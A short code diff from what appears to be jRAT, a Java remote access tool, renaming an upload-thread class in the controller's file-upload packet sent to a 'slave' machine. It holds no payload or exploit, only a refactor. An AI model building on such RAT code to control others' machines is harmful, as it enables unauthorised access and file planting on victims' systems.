@@ -1,7 +1,7 @@
 package io.jrat.controller.packets.outgoing;
 
 import io.jrat.controller.Slave;
-import io.jrat.controller.threads.UploadThread;
+import io.jrat.controller.threads.ThreadUploadFile;
 import java.io.DataOutputStream;
 import java.io.File;
 
@@ -10,7 +10,7 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 	protected File file;
 	protected String remoteFile;
 	protected boolean temp;
-	protected UploadThread thread;
+	protected ThreadUploadFile thread;
 
 	public Packet42ServerUploadFile(File file, String remoteFile) {
 		this(file, remoteFile, false);
@@ -20,10 +20,10 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 		this.file = file;
 		this.remoteFile = remoteFile;
 		this.temp = temp;
-		this.thread = new UploadThread(null, remoteFile, file);
+		this.thread = new ThreadUploadFile(null, remoteFile, file);
 	}
 	
-	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp, UploadThread thread) {
+	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp, ThreadUploadFile thread) {
 		this.file = file;
 		this.remoteFile = remoteFile;
 		this.temp = temp;
